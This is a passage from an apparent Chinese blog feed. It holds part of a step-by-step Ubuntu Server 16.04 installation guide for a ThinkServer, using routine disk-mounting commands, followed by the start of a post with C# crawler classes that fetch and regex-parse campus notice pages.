LVM(使用整个磁盘并配置LVM)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170318.jpg)</li>\n<li>“Select disk to partition(选择要分区的磁盘)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170325.jpg)</li>\n<li>选择”Partitioning Scheme(分区方案) “，这里推荐选择”All files in one partition(所有文件放在同一分区)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170331.jpg)</li>\n<li>出现如下界面，询问你是否”Write the changes to disks and configure LVM(将修改写入磁盘并配置LVM)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170342.jpg)</li>\n<li>设置”Name of the volume group for the new system(新系统的卷组名)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170359.jpg)</li>\n<li>设置”Amount of volume group to use for guided partitioning(用于分区引导的卷组数)”，默认大小即可，无需修改；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170421.jpg)</li>\n<li>出现下图界面，询问你是否”Umount partitions that are in use(卸载正在使用的分区)”，选择”Yes(是)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170434.jpg)</li>\n<li>出现如下界面，询问你是否”Force UEFI installation(强制UEFI安装)”，选择”Yes(是)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170442.jpg)</li>\n<li>出现如下界面，询问是否”Write the changes to disks(将改动写入磁盘)”，选择”Yes(是)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170452.jpg)</li>\n<li>“Kernel to install(要安装的内核)”,选择默认的”Linux-generic”即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170544.jpg)</li>\n<li>回车后出现如下界面，这里要选择包含在initrd中的驱动程序，选择默认的”generic:include all available drivers(通用:包含所有可用的驱动程序)”即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170555.jpg)</li>\n<li>“HTTP proxy information(HTTP代理信息)”不写，直接回车即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170657.jpg)</li>\n<li>询问你管理系统更新的方式，选择”No automatic updates(不自动更新)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170737.jpg)</li>\n<li>“Choose software to install(选择要安装的软件)”，建议勾选上”OpenSSh server”，然后回车;<br>选择方法为:通过键盘上下键移动光标至选要择项，在要选择的项上按空格即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724154325.jpg)</li>\n<li>回车后，显示安装完成，继续回车，重启系统，此时就可以拔掉U盘；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170940.jpg)</li>\n<li>重启后，再次进入TDM，将”Boot Mode(引导模式)”改为”Legacy　Only(仅Legacy模式)”，否则有可能出现不能进入Linux系统的情况；</li>\n</ol>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"准备工作 在Ubuntu官网上下载Ubuntu Server 16.04的ISO镜像(下载链接)； 使用刻录软件(如:软碟通)将iso镜像文件写入U盘中，制成启动盘； 将ISO镜像文件拷贝至U盘的根目录，为了方便后续操作，这里可将镜像文件重命名为Ubuntu.iso； 设置引导 按电源键开机，启动服务器(服务器启动可能会比较缓慢)；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134039.jpg) 出现此界面时，按”F10”进入TDM(ThinkServer Deployment Manager)；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134100.jpg) 进入TDM后，选择”BIOS Setup(BIOS 设置)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134421.jpg) 选择”Boot Manager(引导管理)”,将”Boot Mode(引导模式)”改为”UEFI Only(仅UEFI模式)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134519.jpg) 点击”Save &amp; Reset(保存 &amp; 重启)”,在弹出的对话框中选择”Yes(是)”重启电脑。如果出现如下对话框，选择”No(否)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134545.jpg) 开始安装 将U盘插入服务器后的USB插槽中，重启服务器，进入下图所示界面。选择”Install Ubuntu Server(安装Ubuntu服务器版)”；注:若无法进入下图所示界面，请进入BIOS修改U盘为第一启动项。![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165615.jpg) 选择安装过程和系统的默认语言为”English(英语)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165649.jpg) “Select your location(选择你的区域)”，这里选择”Other(其他)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153430.jpg) “Continent or region(大陆或地区)”选择”Asia(亚洲)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153439.jpg) “Country(国家)”选择”China(中国)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153448.jpg) 是否通过一系列的按键检测键盘布局，选择”NO(否)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165712.jpg) 字符集编码选择”United States -en_US.UTF-8”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153454.jpg) “Country or Region for the keyboard(键盘布局所属国家或地区)”,选择”English(US)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165717.jpg) “Keyboard layout(键盘布局)”，选择”English(US)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165725.jpg) 稍等片刻，将会显示出现错误,原因为:安装程序未检测到CD-ROM。是否重试，选择”No(否)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165744.jpg) 进入如下界面，选择”Execute a shell(运行shell)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165801.jpg) 在shell中依次输入如下命令:123456ls /dev/sd*umount /dev/sdb4/mkdir udevmount /dev/sdb4 /udevmount /udev/ubuntu.iso /cdromexit 一般会出现两个/dev/sdb*项，我们选择带数字的那一项去替换上面代码中的/dev/sdb4;ubuntu.iso为U盘中Ubuntu Server的ISO镜像的文件名”。![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165911.jpg) 进入如下界面后，选择”Detect and mount CD-ROM(探测并挂载光盘)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165919.jpg) 进入如下界面，选择”Network interface(网络接口)”，这里选择第一个网络接口，等待安装程序自动完成配置；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165949.jpg) 设置”Hostname(主机名)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170037.jpg) 设置”Full name for the new user(新用户的全名)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170121.jpg) 设置”Username for your account(你账号的用户名)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170137.jpg) 设置”password for the new user(新用户的密码)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170145.jpg) 如果所设置的密码较为简单，可能会弹出如下对话框，询问你是否使用一个”weak password(弱口令)”，选择”Yes(是)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170157.jpg) 出现如下界面，询问你是否”Encrypt your home directory(加密你的主目录)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170208.jpg) 然后可能会出现时区设置错误，选择 “Continue(继续)”,进入如下界面，选择”Install the system(安装系统)”,然后直接回车，选择”Partion disks(磁盘分区)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170228.jpg)![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170234.jpg) 出现下图界面，询问你是否”Umount partitions that are in use(卸载正在使用的分区)”，选择”Yes(是)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170255.jpg) 选择”Partitioning method(分区方法)”，这里我们选择”Guided - use entire disk and set up LVM(使用整个磁盘并配置LVM)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170318.jpg) “Select disk to partition(选择要分区的磁盘)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170325.jpg) 选择”Partitioning Scheme(分区方案) “，这里推荐选择”All files in one partition(所有文件放在同一分区)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170331.jpg) 出现如下界面，询问你是否”Write the changes to disks and configure LVM(将修改写入磁盘并配置LVM)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170342.jpg) 设置”Name of the volume group for the new system(新系统的卷组名)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170359.jpg) 设置”Amount of volume group to use for guided partitioning(用于分区引导的卷组数)”，默认大小即可，无需修改；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170421.jpg) 出现下图界面，询问你是否”Umount partitions that are in use(卸载正在使用的分区)”，选择”Yes(是)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170434.jpg) 出现如下界面，询问你是否”Force UEFI installation(强制UEFI安装)”，选择”Yes(是)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170442.jpg) 出现如下界面，询问是否”Write the changes to disks(将改动写入磁盘)”，选择”Yes(是)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170452.jpg) “Kernel to install(要安装的内核)”,选择默认的”Linux-generic”即可；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170544.jpg) 回车后出现如下界面，这里要选择包含在initrd中的驱动程序，选择默认的”generic:include all available drivers(通用:包含所有可用的驱动程序)”即可；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170555.jpg) “HTTP proxy information(HTTP代理信息)”不写，直接回车即可；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170657.jpg) 询问你管理系统更新的方式，选择”No automatic updates(不自动更新)”；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170737.jpg) “Choose software to install(选择要安装的软件)”，建议勾选上”OpenSSh server”，然后回车;选择方法为:通过键盘上下键移动光标至选要择项，在要选择的项上按空格即可；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724154325.jpg) 回车后，显示安装完成，继续回车，重启系统，此时就可以拔掉U盘；![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170940.jpg) 重启后，再次进入TDM，将”Boot Mode(引导模式)”改为”Legacy Only(仅Legacy模式)”，否则有可能出现不能进入Linux系统的情况；","summary":"准备工作 在Ubuntu官网上下载Ubuntu Server 16.04的ISO镜像(下载链接)； 使用刻录软件(如:软碟通)将iso镜像文件写入U盘中，制成启动盘； 将ISO镜像文件拷贝至U盘的根目录，为了方便后续操作，这里可将镜像文件重命名为Ubuntu.iso；","date_published":"2018-07-24T14:50:22.000Z","tags":["Linux","Linux","Ubuntu"]},{"id":"https://zhaoqi.vip/posts/976598171/","url":"https://zhaoqi.vip/posts/976598171/","title":"用C#爬虫爬取校园最新通知","content_html":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>前几个月用Python写了一个爬虫，用于爬取校园最新通知。最近的C#课程设计中想实现同样的功能，于是按照之前Python代码的思路重构了一下。<br><a href=\"https://zhaoqi99.github.io/45013.html\">用Python实现校园通知更新提醒</a></p>\n<span id=\"more\"></span>\n\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>使用C#中的HttpWebRequest库去获取目标url(各个网站的’更多通知’页)的源代码，然后使用<code> System.Text.RegularExpressions;</code>进行正则匹配。<br>正则表达式应包含三个分组:日期、标题、链接；</p>\n<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><ul>\n<li>命名空间导入<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System.Net;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Collections;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Text.RegularExpressions;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"源代码\"><a href=\"#源代码\" class=\"headerlink\" title=\"源代码\"></a>源代码</h2><p>Spider基类:</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">Spider</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">string</span> url = <span class=\"built_in\">string</span>.Empty;<span class=\"comment\">//要爬取的网页的url</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> HttpWebRequest request;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> HttpWebResponse response;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> encode = <span class=\"string\">&quot;UTF-8&quot;</span>;<span class=\"comment\">//目标url的网页编码格式</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> Method = <span class=\"built_in\">string</span>.Empty;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> Url</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">get</span> &#123; <span class=\"keyword\">return</span> url; &#125;</span><br><span class=\"line\">        <span class=\"keyword\">set</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            url = <span class=\"keyword\">value</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> Encode</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">get</span> &#123; <span class=\"keyword\">return</span> encode; &#125;</span><br><span class=\"line\">        <span class=\"keyword\">set</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">value</span> == <span class=\"string\">&quot;UTF-8&quot;</span> || <span class=\"keyword\">value</span> == <span class=\"string\">&quot;GBK&quot;</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                encode = <span class=\"keyword\">value</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"comment\">//Todo:handle exception</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Spider</span>(<span class=\"params\"><span class=\"built_in\">string</span> url,<span class=\"built_in\">string</span> method</span>)</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.url = url;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.Method = method;</span><br><span class=\"line\">        Create();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Spider</span>()</span> &#123; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">Create</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class=\"line\">        request.Method = Method;</span><br><span class=\"line\">        request.Credentials = CredentialCache.DefaultCredentials;</span><br><span class=\"line\">        request.UserAgent = <span class=\"string\">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//获取目标url的Html代码</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"built_in\">string</span> <span class=\"title\">getHtml</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">string</span> reader = <span class=\"built_in\">string</span>.Empty;</span><br><span class=\"line\">        <span class=\"keyword\">try</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Create();</span><br><span class=\"line\">            response = (HttpWebResponse)request.GetResponse();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                StreamReader sr = <span class=\"keyword\">new</span> StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encode));</span><br><span class=\"line\">                reader = sr.ReadToEnd();</span><br><span class=\"line\">                sr.Close();</span><br><span class=\"line\">                response.Close();<span class=\"comment\">//关闭response响应流</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Exception();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">catch</span>(Exception e)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Log.Write( e.Message, <span class=\"string\">&quot;Exception&quot;</span>);</span><br><span class=\"line\">            MessageBox.Show(e.Message, <span class=\"string\">&quot;错误&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> reader;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>SpiderNotice类:</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">SpiderNotice</span> : <span class=\"title\">Spider</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">string</span> url_main;<span class=\"comment\">//各个通知链接的公共部分</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">string</span> department;<span class=\"comment\">//所属部门</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">string</span> type;<span class=\"comment\">//通知类型</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">string</span> pattern;<span class=\"comment\">//用于匹配的正则表达式规则</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> ArrayList all_notice = <span class=\"keyword\">new</span> ArrayList();<span class=\"comment\">//所有的通知</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> parse = <span class=\"built_in\">string</span>.Empty;<span class=\"comment\">//日期的解析规则</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SpiderNotice</span>(<span class=\"params\"><span class=\"built_in\">string</span> url, <span class=\"built_in\">string</span> pattern, <span class=\"built_in\">string</span> url_main, <span class=\"built_in\">string</span> department, <span class=\"built_in\">string</span> type</span>) : <span class=\"title\">base</span>(<span class=\"params\">url, <span class=\"string\">&quot;GET&quot;</span></span>)</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.department = department;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.pattern = pattern;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.url_main = url_main;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.type = type;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.parse = <span class=\"string\">&quot;yyyy-MM-dd&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">Get</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        all_notice.Clear();</span><br><span class=\"line\">        Regex r = <span class=\"keyword\">new</span> Regex(pattern, RegexOptions.ExplicitCapture);</span><br><span class=\"line\">        <span class=\"keyword\">try</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"built_in\">string</span> s = getHtml();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (s == <span class=\"literal\">null</span>)</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> ArgumentNullException(<span class=\"string\">&quot;html&quot;</span>);</span><br><span class=\"line\">            MatchCollection mc = r.Matches(s);</span><br><span class=\"line\">            <span class=\"keyword\">foreach</span> (Match m <span class=\"keyword\">in</span> mc)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                GroupCollection <span class=\"keyword\">group</span> = m.Groups;</span><br><span class=\"line\">                DateTime date = DateTime.ParseExact(<span class=\"keyword\">group</span>[<span class=\"string\">&quot;date&quot;</span>].Value, parse, System.Globalization.CultureInfo.InstalledUICulture);</span><br><span class=\"line\">                <span class=\"built_in\">string</span> link = url_main + <span class=\"keyword\">group</span>[<span class=\"string\">&quot;link&quot;</span>].Value;</span><br><span class=\"line\">                Notice n = <span class=\"keyword\">new</span> Notice();</span><br><span class=\"line\">                n.Title = <span class=\"keyword\">group</span>[<span class=\"string\">&quot;title&quot;</span>].Value;</span><br><span class=\"line\">                n.Link = link;</span><br><span class=\"line\">                n.Date = date;</span><br><span class=\"line\">                n.Department = department;</span><br><span class=\"line\">                n.Type = type;</span><br><span class=\"line\">                all_notice.Add(n);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">catch</span> (Exception e)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            BLL.Log.Write(e.Message, <span class=\"string\">&quot;Exception&quot;</span>);</span><br><span class=\"line\">            MessageBox.Show(e.Message, <span class=\"string\">&quot;错误&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Notice <span class=\"title\">index</span>(<span class=\"params\"><span class=\"built_in\">int</span> index</span>)</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index &gt;= all_notice.Count)</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IndexOutOfRangeException();</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> all_notice[index] <span class=\"keyword\">as</span> Notice;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Notice[] <span class=\"title\">GetAll</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Notice[] All = <span class=\"keyword\">new</span> Notice[all_notice.Count];</span><br><span class=\"line\">        <span class=\"built_in\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"built_in\">object</span> t <span class=\"keyword\">in</span> all_notice)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            All[flag++] = t <span class=\"keyword\">as</span> Notice;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> All;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"built_in\">int</span> <span class=\"title\">Count</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> all_notice.Count;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>数据模型Notice类:</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span 